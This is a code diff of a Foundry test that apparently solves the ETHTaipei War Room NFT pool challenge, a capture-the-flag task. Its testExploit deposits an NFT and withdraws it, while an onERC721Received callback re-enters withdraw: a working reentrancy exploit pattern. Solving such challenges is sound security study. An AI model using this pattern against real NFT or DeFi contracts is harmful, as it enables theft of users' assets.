@@ -1,21 +1,33 @@
-// SPDX-License-Identifier: UNLICENSED
-pragma solidity >=0.7.0 <0.8.0;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.7.0;
 pragma experimental ABIEncoderV2;
 
 import {Test} from "forge-std/Test.sol";
-import {Pool} from "src/ETHTaipeiWarRoomNFT/Pool.sol";
+import {Pool, PoolBase} from "src/ETHTaipeiWarRoomNFT/Pool.sol";
 import {WarRoomNFT} from "src/ETHTaipeiWarRoomNFT/NFT.sol";
 
 contract PoolTest is Test {
     Pool public pool;
     WarRoomNFT public nft;
+    PoolBase public base;
     uint256 times = 0;
-    uint256 _tokenId;
 
     function setUp() public {
-        nft = new WarRoomNFT();
-        pool = new Pool(address(nft));
-        _tokenId = nft.mint(address(this));
+        uint256 startTime = block.timestamp + 60;
+        uint256 endTime = startTime + 60;
+        uint256 fullScore = 100;
+        base = new PoolBase(startTime, endTime, fullScore);
+        base.setup();
+    }
+
+    function testExploit() public {
+        nft = base.nft();
+        pool = base.pool();
+        uint256 tokenId = base.tokenId();
+        nft.approve(address(pool), tokenId);
+        pool.deposit(tokenId);
+        pool.withdraw(tokenId);
+        base.solve();
     }
 
     function onERC721Received(address, address, uint256 tokenId, bytes memory) external returns (bytes4) {
@@ -25,12 +37,5 @@ contract PoolTest is Test {
             pool.withdraw(tokenId);
         }
         return this.onERC721Received.selector;
-    }
-
-    function testExploit() public {
-        nft.approve(address(pool), _tokenId);
-        pool.deposit(_tokenId);
-        pool.withdraw(_tokenId);
-        assertEq(pool.isSolved(), true);
     }
 }
